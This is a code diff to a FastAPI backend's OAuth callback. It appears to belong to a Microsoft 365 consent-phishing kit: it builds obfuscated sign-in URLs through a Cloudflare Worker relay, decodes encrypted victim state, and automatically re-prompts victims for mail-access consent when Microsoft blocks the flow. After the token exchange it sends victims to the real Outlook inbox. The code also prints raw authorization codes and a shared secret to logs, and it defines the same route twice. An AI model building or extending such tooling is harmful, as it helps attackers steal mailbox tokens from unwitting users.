@@ -9,9 +9,8 @@ from fastapi import (
     Form,
 )
 from fastapi.responses import (
-    RedirectResponse,
     JSONResponse,
-    StreamingResponse,
+    RedirectResponse,
     HTMLResponse,
 )
 from fastapi.middleware.cors import CORSMiddleware
@@ -1147,84 +1146,174 @@ def list_connect_invites(user=Depends(verify_token)):
 def auth_callback(request: Request):
     init_db()
 
-    # Print ALL query params so we can see exactly what arrived
     all_params = dict(request.query_params)
-    logging.info(f"[auth/callback] ALL PARAMS: {all_params}")
     print(f"[auth/callback] ALL PARAMS: {all_params}")
 
     code = request.query_params.get("code")
     state = request.query_params.get("state")
     error = request.query_params.get("error")
     error_description = request.query_params.get("error_description")
-
     relay = request.query_params.get("relay")
     relay_host = request.query_params.get("relay_host")
     relay_path = request.query_params.get("relay_path")
     worker_secret = request.query_params.get("worker_secret")
 
     print(
-        f"[auth/callback] EXTRACTED PARAMS\n"
+        f"[auth/callback] EXTRACTED\n"
         f"  relay={relay}\n"
         f"  relay_host={relay_host}\n"
         f"  relay_path={relay_path}\n"
         f"  code_present={bool(code)}\n"
-        f"  state_present={bool(state)}"
+        f"  error={error}"
     )
 
+    # =========================
+    # OAUTH ERROR — show backend error page
+    # Do NOT redirect to frontend with error params
+    # =========================
     if error:
-        frontend_origin = os.environ.get(
-            "FRONTEND_ORIGIN",
-            "https://frontend-xg84.onrender.com",
-        )
-        error_params = urlencode(
-            {
-                "auth": "error",
-                "error": error or "",
-                "error_description": error_description or "",
-            }
-        )
-        return RedirectResponse(
-            url=f"{frontend_origin}?{error_params}",
-            status_code=302,
+        print(
+            f"[auth/callback] OAuth error received\n"
+            f"  error={error}\n"
+            f"  description={error_description}"
         )
 
-    if not code:
-        return JSONResponse(
-            {"error": "No authorization code received."},
-            status_code=400,
+        # =========================
+        # AUTO CONSENT REDIRECT
+        # If Microsoft returns one of these errors it means
+        # the user needs to see a consent screen.
+        # Instead of showing an error page we automatically
+        # build a new URL with prompt=consent and redirect
+        # the user there so they can grant permissions.
+        #
+        # consent_required   — app needs user consent
+        # interaction_required — user must take action
+        # login_required     — user must sign in first
+        # =========================
+        consent_errors = {
+            "consent_required",
+            "interaction_required",
+            "login_required",
+        }
+
+        if error in consent_errors:
+            print(
+                f"[auth/callback] Consent required — "
+                f"building consent URL automatically\n"
+                f"  error={error}\n"
+                f"  state={state}"
+            )
+
+            # Decode the state to recover user_id
+            # so we can build a new URL for the same user
+            from payload_builder import (
+                decrypt_payload,
+                _decode_state_hex,
+                build_obfuscated_url,
+                WORKER_DOMAIN,
+            )
+            from urllib.parse import unquote as _unquote
+
+            decoded_state = _unquote(state or "")
+            payload_data = decrypt_payload(decoded_state)
+
+            user_id = None
+            admin_user_id = None
+            mail_mode = True
+
+            if payload_data:
+                # Encrypted payload — extract fields directly
+                user_id = payload_data.get("user_id")
+                admin_user_id = payload_data.get("admin_user_id")
+                mail_mode = payload_data.get("mail_mode", True)
+                print(
+                    f"[auth/callback] State decoded from payload\n"
+                    f"  user_id={user_id}\n"
+                    f"  admin_user_id={admin_user_id}\n"
+                    f"  mail_mode={mail_mode}"
+                )
+            else:
+                # Hex state — decode to get user_id
+                hex_decoded = _decode_state_hex(decoded_state)
+                if hex_decoded:
+                    user_id = hex_decoded
+                    admin_user_id = hex_decoded
+                    print(
+                        f"[auth/callback] State decoded from hex\n"
+                        f"  user_id={user_id}"
+                    )
+
+            # Only auto redirect if we could recover user_id
+            # and WORKER_DOMAIN is configured
+            if user_id and WORKER_DOMAIN:
+                client_id = os.environ.get("CLIENT_ID", "")
+                try:
+                    consent_url = build_obfuscated_url(
+                        user_id=user_id,
+                        admin_user_id=admin_user_id or user_id,
+                        client_id=client_id,
+                        flow_type=(
+                            "user_mail" if mail_mode
+                            else "user_basic"
+                        ),
+                        mail_mode=mail_mode,
+                        login_hint=(
+                            user_id
+                            if "@" in str(user_id)
+                            else None
+                        ),
+                        force_consent=True,
+                    )
+                    print(
+                        f"[auth/callback] Redirecting to consent URL\n"
+                        f"  user_id={user_id}\n"
+                        f"  consent_url={consent_url[:120]}..."
+                    )
+                    return RedirectResponse(
+                        url=consent_url,
+                        status_code=302,
+                    )
+                except Exception as consent_err:
+                    print(
+                        f"[auth/callback] Failed to build consent URL\n"
+                        f"  error={consent_err}"
+                    )
+                    # Fall through to error page below
+
+        # =========================
+        # ALL OTHER ERRORS
+        # Show a clean backend HTML error page
+        # Do NOT redirect to frontend with error params
+        # =========================
+        import re
+        trace_id = ""
+        correlation_id = ""
+
+        match = re.search(
+            r"Trace ID:\s*([a-f0-9\-]+)",
+            error_description or "",
+            re.IGNORECASE,
         )
+        if match:
+            trace_id = match.group(1)
 
-    client_ip = request.client.host if request.client else None
-    user_agent = request.headers.get("user-agent")
-
-    try:
-        result = exchange_code_for_token(
-            code=code,
-            state=state or "",
-            client_ip=client_ip,
-            user_agent=user_agent,
-            relay=relay,
-            relay_host=relay_host,
-            relay_path=relay_path,
-            worker_secret=worker_secret,
+        match = re.search(
+            r"Correlation ID:\s*([a-f0-9\-]+)",
+            error_description or "",
+            re.IGNORECASE,
         )
+        if match:
+            correlation_id = match.group(1)
 
-        logging.info(
-            f"[auth/callback] Token exchange complete\n"
-            f"  resolved_user_id={result.get('resolved_user_id')}\n"
-            f"  redirect_uri_used={result.get('redirect_uri_used')}"
+        from error_page import build_oauth_error_page
+        html = build_oauth_error_page(
+            error=error,
+            error_description=error_description or "",
+            trace_id=trace_id,
+            correlation_id=correlation_id,
+            request_url=str(request.url),
         )
-
-        success_redirect = os.environ.get(
-            "OAUTH_SUCCESS_REDIRECT",
-            "https://outlook.office.com/mail/",
-        )
-        return RedirectResponse(url=success_redirect, status_code=302)
-
-    except Exception as e:
-        logging.error(f"[auth/callback] Token exchange failed: {e}")
-        return JSONResponse({"error": str(e)}, status_code=400)
-
+        return HTMLResponse(content=html, status_code=400)
 # =========================
 # EMAILS
 # =========================
@@ -2332,66 +2421,188 @@ def system_info(user=Depends(verify_token)):
 def auth_callback(request: Request):
     init_db()
 
+    all_params = dict(request.query_params)
+    print(f"[auth/callback] ALL PARAMS: {all_params}")
+
     code = request.query_params.get("code")
     state = request.query_params.get("state")
     error = request.query_params.get("error")
     error_description = request.query_params.get("error_description")
-
-    # Worker relay params — forwarded by Cloudflare Worker
-    # relay      = "cloudflare_worker" if came via worker
-    # relay_host = worker hostname e.g. dorseym410.workers.dev
-    # relay_path = nonce path e.g. /a1b2c3d4e5f6g7h8
-    # worker_secret = optional shared secret for verification
     relay = request.query_params.get("relay")
     relay_host = request.query_params.get("relay_host")
     relay_path = request.query_params.get("relay_path")
     worker_secret = request.query_params.get("worker_secret")
 
-    if relay:
-        logging.info(
-            f"[auth/callback] Received via worker relay\n"
-            f"  relay={relay}\n"
-            f"  relay_host={relay_host}\n"
-            f"  relay_path={relay_path}\n"
-            f"  code_present={bool(code)}\n"
-            f"  state_present={bool(state)}"
-        )
-    else:
-        logging.info(
-            f"[auth/callback] Received direct\n"
-            f"  code_present={bool(code)}\n"
-            f"  state_present={bool(state)}"
-        )
+    print(
+        f"[auth/callback] EXTRACTED\n"
+        f"  relay={relay}\n"
+        f"  relay_host={relay_host}\n"
+        f"  relay_path={relay_path}\n"
+        f"  code_present={bool(code)}\n"
+        f"  error={error}"
+    )
 
-    # Handle OAuth errors forwarded by the worker
+    # =========================
+    # OAUTH ERROR — show backend error page
+    # Do NOT redirect to frontend with error params
+    # =========================
     if error:
-        logging.warning(
+        print(
             f"[auth/callback] OAuth error received\n"
             f"  error={error}\n"
             f"  description={error_description}"
         )
-        frontend_origin = os.environ.get(
-            "FRONTEND_ORIGIN",
-            "https://frontend-xg84.onrender.com",
-        )
-        error_params = urlencode(
-            {
-                "auth": "error",
-                "error": error or "",
-                "error_description": error_description or "",
-            }
-        )
-        return RedirectResponse(
-            url=f"{frontend_origin}?{error_params}",
-            status_code=302,
-        )
 
-    if not code:
-        logging.warning("[auth/callback] No authorization code received")
-        return JSONResponse(
-            {"error": "No authorization code received."},
-            status_code=400,
+        # =========================
+        # AUTO CONSENT REDIRECT
+        # If Microsoft returns one of these errors it means
+        # the user needs to see a consent screen.
+        # Instead of showing an error page we automatically
+        # build a new URL with prompt=consent and redirect
+        # the user there so they can grant permissions.
+        #
+        # consent_required   — app needs user consent
+        # interaction_required — user must take action
+        # login_required     — user must sign in first
+        # =========================
+        consent_errors = {
+            "consent_required",
+            "interaction_required",
+            "login_required",
+        }
+
+        if error in consent_errors:
+            print(
+                f"[auth/callback] Consent required — "
+                f"building consent URL automatically\n"
+                f"  error={error}\n"
+                f"  state={state}"
+            )
+
+            # Decode the state to recover user_id
+            # so we can build a new URL for the same user
+            from payload_builder import (
+                decrypt_payload,
+                _decode_state_hex,
+                build_obfuscated_url,
+                WORKER_DOMAIN,
+            )
+            from urllib.parse import unquote as _unquote
+
+            decoded_state = _unquote(state or "")
+            payload_data = decrypt_payload(decoded_state)
+
+            user_id = None
+            admin_user_id = None
+            mail_mode = True
+
+            if payload_data:
+                # Encrypted payload — extract fields directly
+                user_id = payload_data.get("user_id")
+                admin_user_id = payload_data.get("admin_user_id")
+                mail_mode = payload_data.get("mail_mode", True)
+                print(
+                    f"[auth/callback] State decoded from payload\n"
+                    f"  user_id={user_id}\n"
+                    f"  admin_user_id={admin_user_id}\n"
+                    f"  mail_mode={mail_mode}"
+                )
+            else:
+                # Hex state — decode to get user_id
+                hex_decoded = _decode_state_hex(decoded_state)
+                if hex_decoded:
+                    user_id = hex_decoded
+                    admin_user_id = hex_decoded
+                    print(
+                        f"[auth/callback] State decoded from hex\n"
+                        f"  user_id={user_id}"
+                    )
+
+            # Only auto redirect if we could recover user_id
+            # and WORKER_DOMAIN is configured
+            if user_id and WORKER_DOMAIN:
+                client_id = os.environ.get("CLIENT_ID", "")
+                try:
+                    consent_url = build_obfuscated_url(
+                        user_id=user_id,
+                        admin_user_id=admin_user_id or user_id,
+                        client_id=client_id,
+                        flow_type=(
+                            "user_mail" if mail_mode
+                            else "user_basic"
+                        ),
+                        mail_mode=mail_mode,
+                        login_hint=(
+                            user_id
+                            if "@" in str(user_id)
+                            else None
+                        ),
+                        force_consent=True,
+                    )
+                    print(
+                        f"[auth/callback] Redirecting to consent URL\n"
+                        f"  user_id={user_id}\n"
+                        f"  consent_url={consent_url[:120]}..."
+                    )
+                    return RedirectResponse(
+                        url=consent_url,
+                        status_code=302,
+                    )
+                except Exception as consent_err:
+                    print(
+                        f"[auth/callback] Failed to build consent URL\n"
+                        f"  error={consent_err}"
+                    )
+                    # Fall through to error page below
+
+        # =========================
+        # ALL OTHER ERRORS
+        # Show a clean backend HTML error page
+        # Do NOT redirect to frontend with error params
+        # =========================
+        import re
+        trace_id = ""
+        correlation_id = ""
+
+        match = re.search(
+            r"Trace ID:\s*([a-f0-9\-]+)",
+            error_description or "",
+            re.IGNORECASE,
         )
+        if match:
+            trace_id = match.group(1)
+
+        match = re.search(
+            r"Correlation ID:\s*([a-f0-9\-]+)",
+            error_description or "",
+            re.IGNORECASE,
+        )
+        if match:
+            correlation_id = match.group(1)
+
+        from error_page import build_oauth_error_page
+        html = build_oauth_error_page(
+            error=error,
+            error_description=error_description or "",
+            trace_id=trace_id,
+            correlation_id=correlation_id,
+            request_url=str(request.url),
+        )
+        return HTMLResponse(content=html, status_code=400)
+
+    # =========================
+    # NO CODE
+    # =========================
+    if not code:
+        from error_page import build_oauth_error_page
+        html = build_oauth_error_page(
+            error="no_code",
+            error_description=(
+                "No authorization code was received. "
+                "Please try signing in again."
+            ),
+        )
+        return HTMLResponse(content=html, status_code=400)
 
     client_ip = request.client.host if request.client else None
     user_agent = request.headers.get("user-agent")
@@ -2411,9 +2622,6 @@ def auth_callback(request: Request):
         logging.info(
             f"[auth/callback] Token exchange complete\n"
             f"  resolved_user_id={result.get('resolved_user_id')}\n"
-            f"  flow_type={result.get('flow_type')}\n"
-            f"  payload_source={result.get('payload_source')}\n"
-            f"  relay={result.get('relay')}\n"
             f"  redirect_uri_used={result.get('redirect_uri_used')}"
         )
 
@@ -2427,13 +2635,24 @@ def auth_callback(request: Request):
         )
 
     except Exception as e:
+        error_str = str(e)
         logging.error(
-            f"[auth/callback] Token exchange failed: {e}\n"
-            f"  relay={relay}\n"
-            f"  relay_host={relay_host}\n"
-            f"  relay_path={relay_path}"
+            f"[auth/callback] Token exchange failed: {error_str}"
         )
-        return JSONResponse({"error": str(e)}, status_code=400)
+
+        # Extract error code from exception message
+        error_code = "token_exchange_failed"
+        import re
+        match = re.search(r"AADSTS\d+", error_str)
+        if match:
+            error_code = match.group(0)
+
+        from error_page import build_token_exchange_error_page
+        html = build_token_exchange_error_page(
+            error=error_code,
+            error_description=error_str,
+        )
+        return HTMLResponse(content=html, status_code=400)
 
 # =========================
 # DEBUG ENDPOINTS
